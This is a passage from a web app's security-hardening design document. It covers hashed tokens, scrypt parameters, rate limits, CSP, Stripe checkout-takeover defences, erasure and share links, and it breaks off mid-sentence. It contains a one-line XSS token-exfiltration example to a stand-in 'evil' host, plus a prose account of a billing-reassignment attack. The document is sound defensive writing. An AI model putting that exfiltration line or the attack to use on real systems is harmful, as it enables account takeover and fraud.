# Security model & hardening

How Stagify authenticates, protects its endpoints, and bounds abuse. This is the
rationale behind the limits in the code — change them deliberately. Related:
[`environment-variables.md`](../reference/environment-variables.md),
[`data-stores.md`](../reference/data-stores.md), [`endpoints.md`](../reference/endpoints.md).

## Authentication & accounts

Backed by SQLite (`auth-store.db`, [`lib/data/auth-store.js`](../../lib/data/auth-store.js)):

- **Passwords:** hashed with **scrypt** using a per-user 16-byte random salt, and
  stored with the cost parameters that produced them — see
  [Password hashes carry their cost](#password-hashes-carry-their-cost). Never
  stored or logged in plaintext.
- **Sessions:** random 30-day tokens, validated on each request until logout. Stored
  **SHA-256 hashed**, never raw — see [Tokens at rest](#tokens-at-rest).
- **Registration:** email-verified — a code with a **15-minute expiry** and **max 5
  verify attempts** before it's invalidated.
- **Password reset:** **single-use** tokens, hashed at rest like sessions and expiring
  after an hour; the "forgot password" flow is **non-enumerating** (it does not reveal
  whether an email exists). Completing a reset **revokes every live session** for that
  account — see [Password reset revokes sessions](#password-reset-revokes-sessions).
- **Google Sign-In:** ID tokens are verified with `google-auth-library`
  (`OAuth2Client`) against `GOOGLE_CLIENT_ID`. Disabled on staging (see below).
- **Staging requires sign-in:** `POST /api/process-image` returns `401 AUTH_REQUIRED`
  for any request without a valid session — there is **no** anonymous/"mobile UA"
  staging path (that former per-IP bypass was removed to close the IP-rotation
  cost-abuse vector).
- **Free-tier daily cap:** free accounts are capped at **`FREE_DAILY_LIMIT` (50)
  generations per UTC day**, enforced server-side **before** any paid AI call
  (`freeGenerationStatus` in `lib/data/auth-store.js`); over-cap requests get
  `429 DAILY_LIMIT_REACHED`. Pro accounts are uncapped; enterprise-domain users are
  metered and billed separately.

## Enterprise domains are a blanket grant

An active enterprise domain upgrades **every** account whose email ends in it to
`pro` (`enhanceUserWithEnterprise` → `enterpriseStore.isActiveDomain`). That makes the
domain field on `enterprise.html` a privilege-escalation surface, not just a form
field: registering `gmail.com` would hand Stagify+ to a large slice of the internet
for the price of one seat.

So **public mailbox providers cannot be registered** — free consumer providers and
common disposable services, listed with their matcher in
[`lib/data/public-email-domains.js`](../../lib/data/public-email-domains.js). Input is
normalized before matching (case, an `@` prefix, a full address, a trailing dot, a
pasted URL) and subdomains of a listed provider match too, since the buyer controls
neither `gmail.com` nor `mail.gmail.com`.

Enforced at three layers, deliberately overlapping:

1. `POST /api/enterprise/create-checkout` — `400` with code `PUBLIC_EMAIL_DOMAIN`,
   before Stripe is contacted at all.
2. `activateDomain()` — refuses to write the row, so a replayed webhook, hand-edited
   session metadata, or a subscription created directly in the Stripe dashboard
   cannot bypass the route.
3. `isActiveDomain()` — re-checks on **read**. This is the important one: it is the
   single chokepoint every plan upgrade passes through, so it neutralizes a bad row
   regardless of how it got there (the legacy `enterprise-domains.json` import,
   `importStore()` during a restore, a hand-edited DB). It looks redundant next to
   layer 2 — it isn't, and it should not be "simplified" away.

**Scope:** this list gates enterprise registration only. Ordinary signup must keep
accepting gmail/yahoo/outlook addresses — do not wire it into the auth routes.

## Stagify+ checkout: an unverified email may start a subscription, never take one over

Stagify+ is a Stripe **Payment Link**, so the only things tying a completed checkout to
an account are two query parameters that the buyer can edit
([`public/scripts/stagify-plus.js`](../../public/scripts/stagify-plus.js) appends them).
They are not equally trustworthy, and the difference is what it takes to aim one at
somebody else:

| Identifier | Why a buyer can set it | What it takes to target a victim |
|---|---|---|
| `client_reference_id` | URL parameter | The victim's `u_` + 24-hex account id — 96 bits, and nothing exposes it |
| `customer_email` | Typed at Stripe checkout; Stripe never verifies ownership | Knowing their email address |

The email fallback cannot simply be deleted: **"Start free trial" stays clickable when
signed out**, so a checkout with no reference is an ordinary purchase, and removing the
fallback would leave those buyers paying with no plan.

What it must not do is *reassign* an entitlement. Before the guard in
[`lib/data/stripe-linking.js`](../../lib/data/stripe-linking.js), checking out with a
stranger's address overwrote their `stripeCustomerId` / `stripeSubscriptionId`. Two
things followed: their billing portal opened the **buyer's** Stripe customer (invoices,
card last-4, billing address), and — the real payoff — cancelling the buyer's own trial
fired `customer.subscription.deleted` for a subscription id now recorded against the
victim, **downgrading a paying customer who is still being billed**, for the price of a
trial the attacker cancelled.

So an email match may only *start* a billing relationship:

- Refused (`email_match_would_reassign`) when the account already holds a **different
  live subscription** or an **admin comp grant** — both are entitlements the new
  subscription's buyer could later revoke.
- Allowed when it holds neither, which is the ordinary signed-out purchase, a genuine
  re-purchase after a cancellation (`subscription.deleted` clears the subscription id
  but leaves the stale customer id, so "has a customer id" would wrongly refuse), and a
  Stripe redelivery of the same checkout.
- A `client_reference_id` match relinks freely. It is not a targeting vector.

A refusal is a paid checkout that did not activate, so `stripe-webhooks.js` logs it at
**error** level with the subscription and customer ids for manual reconciliation —
deliberately louder than a routine unmapped checkout, since it is also the signature of
someone checking out in another person's name.

Covered by `test/data/stripe-linking.test.js` (the mapping rules, each refusal paired
with the allow case it must not break) and `test/services/stripe-webhooks.test.js` (the
attack as real events, through to the cancellation that used to downgrade the victim).

## Admin / log-export endpoints

The log and data-export routes (`/promptlogs`, `/authstore`, `/api/getpro`, etc.) are
guarded by the **`endpoint_key`** (note the lowercase env name):

- Compared in **constant time** (`sha256` each side, then `crypto.timingSafeEqual`) —
  no early-exit timing leak.
- Session tokens are read from the `Authorization` header / body, **never from the URL
  query string**, so they can't leak via access logs, browser history, or `Referer`.
- Responses carrying secrets/PII set `Cache-Control: no-store` and
  `Referrer-Policy: no-referrer` (`setSensitiveHeaders`).
- **Destructive admin actions are `POST`, never `GET`** — `/resetmemories`,
  `POST /api/status/reset`, `DELETE /api/hosted-images/:id`. The key guard is
  header-only, so no crawler or link prefetch can reach them either way; the verb is
  what stops a *legitimate* replay (an HTTP client retrying an idempotent GET after a
  reset connection, a devtools "replay request", a caching proxy) from wiping twice.
  A `GET` on `/resetmemories` answers `405` with `Allow: POST` and touches nothing.

### No credentials over HTTP — `exportStore` vs `exportRedacted`

`GET /authstore` serves `authStore.exportRedacted()`: users, minus credentials.
It must stay that way. `exportStore()` — the sibling that backs
migration/restore — additionally returns **password hashes and salts,
pending-registration hashes, and a row per live session / outstanding reset token
keyed to its user**. Those token keys are now SHA-256 digests rather than the
bearer values (see *Tokens at rest* below), so the payload no longer hands over
accounts by itself — but it is still every credential the system has, plus a
session→user map.

It used to be what this route returned, so the single static `endpoint_key`
was, on its own, the only thing standing between a leak and every account. The
dashboard never read a single one of those fields.

Rules:
- **Never** serve `exportStore()` over HTTP, on this route or a new one. Backup
  and rollback are the SQLite file itself (Litestream → R2), not a browser
  download.
- `exportRedacted` filters through the `ADMIN_VISIBLE_USER_KEYS` **allowlist**.
  A new admin panel that needs another column adds it there deliberately. Do not
  convert it to a denylist — `rowToUser` spreads `extra_json`, so anything parked
  there would start shipping to the browser on its own.
- Enforced by `test/data/auth-store-sqlite.test.js` (no secret survives
  redaction; unknown `extra_json` fields do not leak) and
  `test/routes/admin-route.test.js` (the route calls the redacted export and
  `exportStore` is never invoked).

### Password hashes carry their cost

A password hash is written as a self-describing string —
`scrypt$N=16384,r=8,p=1,keylen=64$<hex>` — by
[`lib/data/password-hash.js`](../../lib/data/password-hash.js), the single owner of
the format, the verifier, and the parameters.

**Why the parameters are in the value.** They used to be nowhere: the row held bare
hex, so a hash made at any cost looked identical to one made at any other. That is
fine right up to the day you want to raise `N` — at which point old and new rows are
indistinguishable, nothing can report how many accounts are still on the weak cost,
and the only migration available is forcing a password reset on every user.
Verification now reads the cost off the row it is checking, so a store can hold a
mix while accounts migrate. They live in the value rather than a column because a
hash travels through `exportStore`/`importStore`, the frozen `auth-store.json`
fallback, an R2 restore, and the short-lived `pending_registrations` row — each of
which would otherwise have to carry and re-join a parallel column that can desync.

**Raising the cost** is a one-line change to `PASSWORD_PARAMS`:

1. Bump `N` (a power of two; cost is linear in it). Every new hash — sign-up,
   password reset, and every rehash below — uses it immediately.
2. Existing rows keep verifying under their own parameters, and are **re-hashed on
   the owner's next successful sign-in**, with a fresh salt. That is the only moment
   the plaintext exists, so the migration is lazy by design: accounts that never
   sign in keep their old hash until they do.
3. `maxmem` is derived from `N` and `r`, so you do not also hit Node's 32 MB scrypt
   ceiling — the first raise past 16384 would otherwise fail with an opaque
   "memory limit exceeded" rather than simply costing more.

**The cost is also a DoS budget.** Login is unauthenticated and the memory cost is
paid per in-flight attempt, so `N` and `RL_AUTH` (40 / 15 min / IP) move together.
It sits at Node's default (N=16384, ~16 MB, ~100 ms) deliberately.

Enforced by [`test/data/password-hash.test.js`](../../test/data/password-hash.test.js)
(the envelope round-trips, a legacy bare-hex row still verifies, a row at a *different*
cost verifies under its own, and `needsRehash` is never true on a failed attempt) and
by `test/data/auth-store.test.js` (a legacy row signs in and is upgraded in place;
a failed sign-in never rewrites the row).

### Tokens at rest

Session tokens and password-reset tokens are **bearer credentials** — the string
alone authenticates, with no password step. They are therefore stored **hashed**:
[`lib/data/session-tokens.js`](../../lib/data/session-tokens.js) owns both token
tables, hashes on every write, and hashes the presented token on every lookup, so
the database holds `sha256$<digest>` and never a usable token.

This is what keeps a database read from being a mass account takeover. Password
hashes are scrypt, so the DB alone doesn't yield accounts — these two tables were
the exception, and they are the reason a leaked `/data` volume, a Litestream/R2
restore, or the frozen `auth-store.json` is now a disclosure rather than a
break-in.

Notes for anyone touching this:

- **Plain SHA-256, no salt, no stretching, and that is deliberate.** The input is
  already 32 bytes of CSPRNG output — there is no guessable keyspace for a work
  factor to slow down — and validation runs on every authenticated request, so the
  digest has to stay a fast deterministic key. Do not "upgrade" it to scrypt.
- **Write token rows only through `session-tokens.js`.** It is the single
  chokepoint; a new call site that prepares its own `INSERT INTO sessions` puts a
  raw token back on disk.
- **The `sha256$` prefix is load-bearing.** A raw token and its digest are both 64
  hex chars, so the prefix is the only way to tell stored form from raw. It makes
  the boot migration and the backup/legacy import idempotent instead of
  double-hashing, which would sign every user out.
- Enforced by `test/data/auth-store-sqlite.test.js` (raw tokens never appear in
  the tables, a stored digest is not replayable, the migration keeps existing
  sessions valid and is idempotent).

### Tokens in the browser: `localStorage`, not a cookie — accepted risk

The section above is about tokens on *our* disk. In the *browser* the session token
sits in `localStorage` under `stagifyAuthToken`
([`public/scripts/auth.js`](../../public/scripts/auth.js)), which JavaScript on the
page can read. **Any XSS in a page that runs `auth.js` is therefore full account
takeover**, not merely defacement, and the CSP does not contain it: `connectSrc` and
`imgSrc` are both `'https:'`
([`lib/http/app-middleware.js`](../../lib/http/app-middleware.js)), so a stolen token
can be posted to any HTTPS host. This is a known, accepted gap — recorded here so the
next reviewer finds the analysis instead of re-deriving it.

**Why the CSP is not the fix.** Narrowing `connectSrc` alone is theatre while
`imgSrc: 'https:'` stands — `new Image().src = 'https://evil/?t=' + token` exfiltrates
just as well, and `form-action` and top-level navigation remain besides. Both
directives are load-bearing for the Google Ads tag
([`public/scripts/gtag.js`](../../public/scripts/gtag.js) — the `googletagmanager`,
`googleadservices`, `www.google.com` and `*.doubleclick.net` measurement beacons ride
on them, as the `scriptSrc` comment in `app-middleware.js` notes), so tightening
them risks silently losing conversion data — a missed beacon domain produces no error.
An allowlist is worth doing eventually, but as defence in depth, not as this fix.

**Why it is not a one-line change.** The real fix is an `httpOnly` cookie, and the
security benefit arrives only once the browser stops holding a readable token —
cookie plumbing on its own buys nothing. Scope, measured:

- **Server: 2 read sites**, already funnelled — `getAuthUserFromRequest`
  ([`lib/services/auth-helpers.js`](../../lib/services/auth-helpers.js)) and the
  logout/me extraction in [`routes/auth.js`](../../routes/auth.js). Plus set-cookie on
  login / register-verify / google-login and clear on logout.
- **Browser: 14 files, 21 send sites**, all mechanical deletions — `fetch` already
  sends same-origin cookies by default, so removing the `Authorization` header and the
  `authToken` body field is the whole change.
- **Tests: `e2e/fixtures.js` is the only place that fakes a signed-in session**, so the
  browser suite costs one fixture, not twenty specs.
- **There are no cookies in this app today** — no `cookie-parser`, no `res.cookie`
  anywhere. This would be the first.

**The part that is easy to miss: it opens a CSRF surface.** With no auth cookie, the app
is structurally immune to CSRF today. The moment a session cookie is honoured, a
cross-site form POST carries it, so `SameSite=Lax` has to land *in the same commit* as
the cookie, not afterwards. Lax is sufficient here — both cross-site returns were
checked: Stripe → `/plus-welcome.html` is a top-level GET (Lax sends the cookie, the
user stays signed in), and Google sign-in POSTs from our own page (same-site). No
CSRF-token machinery is required.

**The server can keep accepting `Authorization: Bearer` afterwards.** Once the browser
holds nothing readable, an XSS gains nothing from that path, and it preserves the
documented affordance in [`endpoints.md`](../reference/endpoints.md) plus the existing
non-browser callers. Migrating does *not* mean removing it.

**Rollout.** Every currently signed-in user holds a `localStorage` token. Either accept
a one-off forced sign-out on deploy, or add a one-time boot exchange (POST the old
token, receive the cookie, clear `localStorage`) and delete that path a month later.

### Password reset revokes sessions

`completePasswordReset` ([`lib/data/auth-store.js`](../../lib/data/auth-store.js))
rotates the scrypt hash, drops the account's reset tokens, **and deletes every row in
`sessions` for that `user_id`** — all in one transaction, so the new password and the
revocation can never diverge.

The revocation is the point of the flow, not a courtesy. A reset is what someone does
when they believe another party is in their account, and a session token is a bearer
credential with a 30-day life: rotating the password alone would leave a stolen cookie
working for up to a month after the one action the user was told to take. Sessions are
plain DB rows re-read by `validateSession` on every request — there is no in-memory
cache — so the delete takes effect immediately, across every device and process.

Notes for anyone touching this:

- **Signing the user out of their other devices is intended**, not a regression to
  paper over. `POST /api/auth/reset-password` returns a bare `{ ok: true }` and mints
  no session, so the user is already headed to the login page.
- **`dropSessionsForUser` is keyed by `user_id`, so it does not hash its argument** —
  unlike its neighbours in `session-tokens.js`, which all take raw tokens. That
  asymmetry is correct; don't "fix" it by wrapping the id in `hashToken`.
- Enforced by `test/data/auth-store.test.js` ("password reset revokes every existing
  session for that user"): two sessions for the victim both die, and a third user's
  session survives — that last assertion is what catches a `DELETE` that loses its
  `WHERE user_id`.

A **"your password was changed" notice** is emailed to the account owner on success
(`renderPasswordChangedEmail`, sent from the route). That mail is the flow's only
channel back to the real owner — every other step is driven by whoever holds the
mailbox link — so it is how someone learns about an attacker-initiated reset. It is
sent **best-effort**: the password is already changed and the sessions already revoked
by the time it goes out, so a delivery failure is logged and the response is still
`{ ok: true }`. Failing the request there would tell the user their reset didn't work
when it did, and send them round the loop again.

**Not done:** the reset UI itself doesn't mention that other devices were signed out —
only the email says so.

**Still open:** `endpoint_key` remains a single, non-rotating, process-wide
secret with no per-admin identity and no audit trail, and it also guards the CSV
exports (customer emails, prompt text) and mutating routes like
`/api/admin/grant-plus`. Redacting `/authstore` removed the worst blast radius;
it did not fix the admin auth model. `RL_ENDPOINT_KEY` (below) now bounds how fast
that secret can be *guessed*, which is a different problem from the one above —
it does nothing about rotation, identity, or audit.

## Rate limiting

`express-rate-limit`, tunable via env (see the env doc):

| Limiter | Default | Applies to |
|---|---|---|
| `RL_AUTH` | 40 / 15 min | sign-in / account actions (brute-force) |
| `RL_EMAIL` | 6 / 15 min | anything that sends email (spam/abuse) |
| `RL_GEN` | 60 / 5 min | paid AI generation (cost abuse) |
| `RL_CHECKOUT` | 10 / 60 min | `POST /api/enterprise/create-checkout` (see below) |
| `RL_ENDPOINT_KEY` | 10 / 15 min | **wrong** endpoint-access keys (see below) |

### The endpoint-key limiter counts rejections, not requests

The whole admin surface — every CSV export, `/authstore`, comp grants, GDPR erasure —
plus `POST /api/stage-by-endpoint-key` sits behind one shared static secret with no
accounts behind it. Guessing that secret is therefore the only way in, and nothing
bounded the guess rate. The dashboard does show a lockout after a few bad tries, but
that counter lives in the browser ([`public/scripts/admin.js`](../../public/scripts/admin.js)),
so it protects nobody who skips the page and posts the header directly.

Two design points worth not undoing:

- **It counts only rejected attempts.** The limiter runs on the guards' failure path
  only, so a request carrying the right key never touches the bucket. That is what
  lets the ceiling be as low as 10: an operator working in the dashboard cannot
  rate-limit themselves no matter how many requests the page makes. A limiter mounted
  as ordinary middleware on `routes/admin.js` would count *every* request and would
  have to be loose enough to be useless. The 500 "key not configured" path doesn't
  count either — that is our misconfiguration, not somebody guessing.
- **Both guards share ONE limiter instance.** `protectLogs` and
  `stagingEndpointKeyGuard` check the same secret, so two buckets would hand an
  attacker double the budget for alternating between an admin route and the staging
  endpoint.

It lives in [`lib/http/http-guards.js`](../../lib/http/http-guards.js) rather than on a
router for the same reason: the guard is the only place that knows a key was actually
*rejected*, and it is the one chokepoint every route holding the secret passes through.
Imported directly (as `checkoutLimiter` is) so an omitted dep cannot leave the key
unguarded; the `endpointKeyLimiter` dep is a **test seam only**, and `null` mounts the
real one. Guarded by
[`test/http/endpoint-key-limit.test.js`](../../test/http/endpoint-key-limit.test.js).

### The enterprise checkout is public on purpose

`POST /api/enterprise/create-checkout` takes **no session**: a company buys the plan
before anyone on it has an account, so there is nothing to authenticate. That makes
`checkoutLimiter` (`RL_CHECKOUT`, per IP) the only thing bounding it, and it covers
two distinct abuses:

- **Stripe-session spam** — every accepted request creates a real Checkout Session.
- **Customer enumeration** — the duplicate-domain branch answers differently from a
  fresh domain, so an unlimited endpoint would be a lookup service for "is *company.com*
  a Stagify enterprise customer?". The 409 no longer *says* so (it reads "not available
  for self-serve checkout … contact support"), but the branch is still distinguishable;
  the limiter is what makes probing a domain list impractical, not the wording.

Unlike the other limiters, `checkoutLimiter` is imported by
[`routes/billing.js`](../../routes/billing.js) directly rather than taken from the
`server.js` dep bag, so an omitted dep cannot leave the endpoint unlimited. The
`checkoutLimiter` dep is a **test seam only**; passing `null` mounts the real one.
Guarded by [`test/routes/billing-checkout-limit.test.js`](../../test/routes/billing-checkout-limit.test.js).

## Request-size & DoS hardening

The body parsers are the cheapest DoS surface, so they're **scoped**, not global:

- **JSON (`express.json`):** app-wide limit is **1 MB**; only the four routes that
  legitimately carry base64 images in JSON (`/api/chat`, `/api/mask-edit`,
  `/api/segment`, `/api/validate-image`) get **25 MB**. `/api/bug-report` is
  deliberately **not** among them — it is unauthenticated and appends its body to
  `bug_reports.csv` on the same persistent volume as `auth-store.db`, so it keeps the
  1 MB limit *and* clamps every field it stores (`lib/http/bug-report-row.js`), with an
  absolute size ceiling on the file as a backstop. This matters
  because the parser runs before the per-route limiters and `JSON.parse` is
  **synchronous** — a large body on any path would otherwise buffer + block the event
  loop. Guarded by [`test/server/json-body-limit.test.js`](../../test/server/json-body-limit.test.js).
- **Multipart uploads (`multer`, memory storage):** each file is buffered whole in
  RAM, and `.fields()`/`.array()` multiply the cap by the file count, so the caps are
  kept tight:
  - staging (`process-image`, `stage-by-endpoint-key`): **25 MB**/file (×6 max)
  - `chat-upload`: **20 MB**/file (×5) + 25 MB history field
  - `host-image`: **25 MB**
  - Over-cap uploads return a clean **413** (the multer error handler sits *after* the
    routers — a subtle bit; if moved before them it silently regresses to 500).
    Guarded by [`test/server/upload-limits.test.js`](../../test/server/upload-limits.test.js).

> Photos are downscaled to 1920×1080 after receipt, so these caps are already far
> above any real upload. If a legit user hits a 413, raise the specific cap — don't
> widen the global JSON limit.

## Error responses (no stack-trace leak)

Route handlers are async, and on **Express 4** an unhandled rejection would otherwise
either hang the request or fall through to Express's built-in handler — which, when
`NODE_ENV` isn't `production`, renders the full **stack trace** to the client. Two layers
prevent that information leak:

- Every router is built with **`createAsyncRouter()`** ([`lib/http/async-router.js`](../../lib/http/async-router.js)),
  which funnels any escaped async rejection to `next(err)`.
- A **final catch-all** in `server.js` (after the Sentry hook) returns a generic
  `{ error: 'Internal server error' }` `500` — the stack trace is logged server-side (and
  captured by Sentry), never sent to the client. Guarded by
  [`test/http/async-router.test.js`](../../test/http/async-router.test.js).

That covered errors that *escaped* a handler. Errors a handler **caught** used to leak
anyway: `sendError(res, 500, 'X failed', { details: error.message })` was the house style
at ~19 sites across `routes/` and `lib/`, so whatever `sharp`, the Gemini/OpenAI SDKs,
`better-sqlite3`, `fs` or Stripe wrote into `.message` went straight to the caller —
absolute server paths, table and column names, model/quota state, upstream prose, and (on
the public Stripe webhook) which half of a signature check a forger had got wrong.

5xx bodies now carry a **reference** instead: `reportError(context, err)`
([`lib/http/error-ref.js`](../../lib/http/error-ref.js)) logs the error whole under a random
8-char id and returns just that id, so the client sees `{ error, ref }`. The reference is
random rather than derived, so it describes nothing about the failure and cannot be probed;
the operator greps it to find the exact log line. Support is better off than before — a
bare message had no request context and could not be located in the logs at all.

The one-time cleanup is not the protection; the guard is.
[`test/http/error-leak.test.js`](../../test/http/error-leak.test.js) reads the source of every
response-building call in `routes/` and `lib/` and fails the build if `.message` or
`.stack` appears inside one. Multer's `400`s are allowlisted by exact snippet: its fixed
message table ('File too large', 'Unexpected field') describes the caller's own upload and
is written in this repo, not produced by a runtime exception.

## Transport & headers

- **CSP** via `helmet`, tuned for the third parties the app loads (Google, Stripe,
  Supademo/Instagram embeds, the HEIC WASM worker).
  - **`script-src` carries no `'unsafe-inline'`.** All page JS lives in external files
    under `public/scripts/` — there are no inline `<script>` blocks or `on*=` handlers
    left — so the policy genuinely blocks injected script (the core XSS defence). Keep
    it that way: any new client-side JS goes in a file, never inline. Small former
    inline snippets were extracted to dedicated files (e.g. `footer-year.js`,
    `hover-glow.js`, the two page auth-gates); mark hookup points with a `data-*`
    attribute (`data-hover-glow`, `data-print`) and bind in the external script.
  - **`style-src` still allows `'unsafe-inline'`.** The pages carry many inline
    `style=""` attributes, so this stays for now — a deliberately accepted, lower-severity
    gap (CSS injection, not JS execution).
  - Toggle the whole policy with `DISABLE_CSP=1` only to debug a blocked resource.
- **CORS** restricted to the `ALLOWED_ORIGINS` allow-list (defaults to the stagify.ai
  origins + `localhost:3000`).

## File-upload safety

- Staging and host uploads use **type `fileFilter`s** (images → jpeg/png/webp).
  **`host-image` deliberately rejects SVG** — an SVG can carry script and would
  execute on our own origin.
- `chat-upload` intentionally accepts **all** types (the AI handles unsupported ones) —
  a known trade-off; it's still size-capped at 20 MB/file.

## Secrets

- `.env` and the `*.txt` key files are **gitignored**; the server reads the env var
  first, then the file. Production secrets live in the **Render dashboard**
  (`sync: false`), never in the repo. Full list: the env doc.
- Sentry runs with **`sendDefaultPii: false`** — no cookies, auth headers, or client IP
  are sent.

## Staging safety

When `IS_STAGING` is on, **Google Sign-In and Stripe checkout are disabled** and a
staging banner is shown, so a staging deploy can't mint real sessions or take real
payments. Ensure production does **not** set `IS_STAGING`. (See
[`deployment.md`](../operations/deployment.md).)

## Sensitive data at rest

- `auth-store.db` — password hashes + session tokens.
- The CSV logs and the `memories` table (in `auth-store.db`) — emails, IPs, chat content.

All live on the `/data` disk ([`data-stores.md`](../reference/data-stores.md)); the
export endpoints that read them are `endpoint_key`-gated.

### Erasure (the right to be forgotten)

`POST /api/admin/delete-user` is the erasure path — it backs the "request account
deletion" line in the privacy policy, which previously had nothing behind it.

The thing to understand before touching it: **this database has no foreign keys**, so
a `DELETE FROM users` cascades to nothing. The satellite rows that would survive are
not inert — `sessions` holds a **live bearer token** for an account that no longer
exists, and `memories` holds chat content keyed to an id that can no longer be
resolved back to a person if they ask again. The full table set therefore lives in one
place, [`lib/data/user-deletion.js`](../../lib/data/user-deletion.js), runs in a single
transaction, and is enforced by a schema-introspecting drift test that fails the build
when a new user-keyed table or CSV log appears uncovered.

Two deliberate refusals:
- An account with a **live Stripe subscription** is rejected (`ACTIVE_SUBSCRIPTION`).
  Erasing it would keep the card being charged with nothing left to link the charge
  to, and the cancellation webhook would no longer find a user. Cancel in Stripe
  first; `force: true` is for when that has already been done.
- The CSV logs are **redacted, not pruned** — see the storage doc for why row counts
  have to stay put.

Still open: free-text log columns (chat messages, bug-report descriptions) can contain
personal data someone typed about themselves, and nothing can match those
automatically.

## Listing Studio: the first store of user-owned files

Everything else the app persists per user is text (rows, CSV cells). The Listing Studio
stores a customer's **own photographs of a property** and every render made from them, which
changes the blast radius of a mistake here — so three things are deliberate.

**1. The byte-serve routes are session-gated, not unguessable-id public.**
`GET /api/projects/:id/renders/:renderId/image` (and the photo equivalent) run
`requireProAccount` and check ownership against the **validated session user's id** before
streaming anything. Contrast `GET /i/:id`, which is intentionally public behind a random id
— that store holds admin-uploaded marketing assets, so an unguessable URL is an appropriate
control there. It is *not* appropriate for someone's home, so these routes do not copy that
pattern. They also send `X-Content-Type-Options: nosniff` and a **`private`** cache directive
(`private, max-age=31536000, immutable`) — `public` would let a shared proxy cache one
customer's interior.

**2. A foreign or unknown id answers `404`, never `403`.**
A `403` confirms the resource exists. Across projects, photos and renders the answer is the
same 404 whether the id is unknown, belongs to another project, or belongs to another
account, so the API is not an existence oracle for other people's listings. This is the same
reasoning as the enterprise checkout's 409 wording above. Cross-user isolation is pinned by
tests on all four surfaces — project, photo, render, **and the render bytes** — because the
byte route is the one that actually leaks pixels, and it is the easiest to forget.

**3. Storage keys are a validated boundary, not a naming convention.**
A `storage_key` from the database is resolved against the filesystem and then served over
HTTP, so [`project-storage.js`](../../lib/data/project-storage.js) enforces a strict
hex-only key shape **and** re-checks with `path.resolve` that the result stays inside the
projects root. Both, deliberately: the regex is the contract and the containment check is the
backstop, and traversal shapes (`..`, absolute paths, backslashes, encoded dots, null bytes)
are tested individually. Nothing user-supplied is ever interpolated into a path — keys are
built by `keyFor` from ids the server minted.

**Erasure.** A user's project rows *and* their image bytes are destroyed on account deletion:
`PROJECT_CHILD_TABLES` covers the tables that hang off a `projects` row (photos, bibles,
renders — none of which carry a `user_id`, so the schema-introspecting drift guard cannot see
them), and each project's blob directory is removed outright. The row-only version of this
was a real bug caught in development: the rows went and the photographs stayed. See
[`data-stores.md`](../reference/data-stores.md#erasing-one-persons-data).

**The pro gate runs before multer.** Batch photo upload is the one route in `routes/projects.js`
with auth in its middleware chain, and that is deliberate: multer buffers the entire multipart
body into memory before any handler runs, so with the gate only inside the handler an
anonymous request could make this single-instance process allocate `40 × 25 MB` — about a
gigabyte — and be answered "sign in" *after* paying the RAM. `genLimiter` bounds the rate of
those requests, not the cost of one, so it is not the answer. The handler still calls
`requireProAccount` itself and that call remains the authority; the middleware is a pre-filter.
A source-scanning test fails if either half is removed. A disallowed mimetype now answers
`415 UNSUPPORTED_PHOTO_TYPE` rather than a 500 — multer forwards a `fileFilter` rejection as
whatever object the callback was given, *not* as a `MulterError`, so a plain `Error` missed the
router's branch, hit the app catch-all, and filed a Sentry report for a refusal that was
working as designed.

**Upload limits.** Batch photo upload accepts at most **40** files of **25 MB** each (pinned
to `stagingProcessUpload`'s limit — three different numbers for one rule is how a 20 MB frame
came to pass the browser check and then abort the whole batch), image mimetypes only, and
each one still passes the same `validate-image` stageability pre-check as a single upload.
HEIC is rejected client-side with an explicit reason rather than running the WASM converter
40 times in a page.

### Client share links: the one unauthenticated surface

The studio itself is entirely Stagify+ gated, and was designed on the assumption that it
would stay that way. **Share links break that assumption on purpose**, because the two people
the output is for — the seller approving the staging, the buyer viewing the home — will never
have an account. That makes `/s/:token` and the three `/api/share/:token` routes the highest-
risk surface in the feature, and they are built accordingly.

**The token is a credential and is stored like one.** 32 bytes of CSPRNG, base64url, and only
its **sha256 digest** reaches disk — [`project-shares.js`](../../lib/data/project-shares.js)
reuses `hashToken` from [`session-tokens.js`](../../lib/data/session-tokens.js) for exactly
the reason that module exists: stored raw, anything that can read the database file (a stolen
`/data` volume, a Litestream restore, a backup download) becomes a set of ready-to-use links
into customers' listings. The plaintext is returned **once**, from the `POST`, and there is no
read-back path — the store test greps the database file itself for the token rather than
trusting a mapper to omit it, because a mapper-shaped assertion passes the moment someone adds
a different field.

**Every rejection is one indistinguishable `404`.** Unknown, revoked, expired, wrong project,
unknown render, missing blob — one identical body. A `410 Gone` for a revoked link would be
friendlier and would also confirm that the token was once real, which is a slow oracle over
the keyspace; the store returns a reason code and the route deliberately throws it away.

**A render id is re-checked against the token's project.** Resolving a token yields a
`projectId`, and every byte request re-derives ownership from it. Without that check any
valid link would serve any customer's pixels — the same class of bug as trusting `:photoId`
in the authenticated routes, but with no session to narrow the blast radius.

**The manifest is an allowlist by construction.** It is built field by field rather than by
spreading a row, so `userId`, storage keys, prompt text, model names, quality and consistency
scores, error codes and bible ids cannot reach a public URL because someone added a column.

**Leak-through headers.** The token is a path segment, so all four routes send
`Referrer-Policy: no-referrer` — otherwise a click on the agent's own website link would hand
that site a working URL to the listing. All four also send `X-Robots-Tag: noindex, nofollow`,
and the byte routes stay `private` in `Cache-Control`. Revocation and expiry are checked on
**every** request, not cached in the page.

**Erasure reaches it.** `project_shares` is erased by `user_id` in the same transaction as the
account, *and* cascaded by `deleteProject`. A share row that outlives an erasure request is
not an orphan record — it is the subject's home still on the internet after they asked for it
to be gone.

### Seller sign-off: an anonymous free-text write

`POST /api/share/:token/feedback` is the only endpoint in this application where an
**unauthenticated caller writes free text** to the volume the SQLite database and every
customer's photographs live on. `referral_hits` is the only other anonymous write and it
stores no caller-supplied string at all, so this is a category harder and is bounded four
independent ways.

**The ceilings are in the store, not the route** ([`share-feedback.js`](../../lib/data/share-feedback.js)).
A second route — or a refactor of the one that exists — must not be able to write an
unbounded row, so the note clamp, the verdict allowlist and the per-share cap all sit at the
insert. In particular **`MAX_PER_SHARE` is checked inside the insert's own transaction**: two
requests arriving together would otherwise both read 199 and both write, and a limit that can
be raced is not a limit. The test asserts the row *count* after a refused write, not the
return value.

**`feedbackLimiter` is the outer bound only** (`RL_SHARE_FEEDBACK`, 30/15min — far tighter
than `shareLimiter`, because the traffic shapes are opposite: reading a gallery legitimately
fetches ~80 images, writing happens a dozen times and stops). A limiter is per IP and per
window, so it cannot bound total growth and a distributed flood walks past it. Both, on
purpose.

**The listing is taken from the resolved share, never the request body.** A body-supplied
`projectId` would let anyone holding any valid link write rows onto someone else's listing —
the same class of bug as trusting `:photoId`, with no session to narrow it.

**Nothing identifies the viewer.** No IP, no user-agent, no cookie; only a display name they
may optionally type. This is a stronger version of the `referral_hits` posture and for a
